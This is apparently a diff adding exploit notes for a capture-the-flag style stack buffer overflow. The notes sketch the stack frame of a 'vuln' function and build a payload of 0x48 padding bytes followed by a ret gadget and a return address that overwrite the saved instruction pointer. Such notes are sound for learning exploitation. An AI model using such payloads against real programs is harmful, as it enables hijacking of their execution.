@@ -1,0 +1,15 @@
+vuln:
+
+rsp->	
+^
+|
+|
+v
+rbp->	rbp
+		rip
+
+padding = 'A' * 0x48
+ret_gadget = 0x00000000004008cd
+ret_addr = 0x000000000040084d
+
+payload = 'A' * 0x48 + '\xcd\x08\x40\x00\x00\x00\x00\x00' + '\x4d\x08\x40\x00\x00\x00\x00\x00'
